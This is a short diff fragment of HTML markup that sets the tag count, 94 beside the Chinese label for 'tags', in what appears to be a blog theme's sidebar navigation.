+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
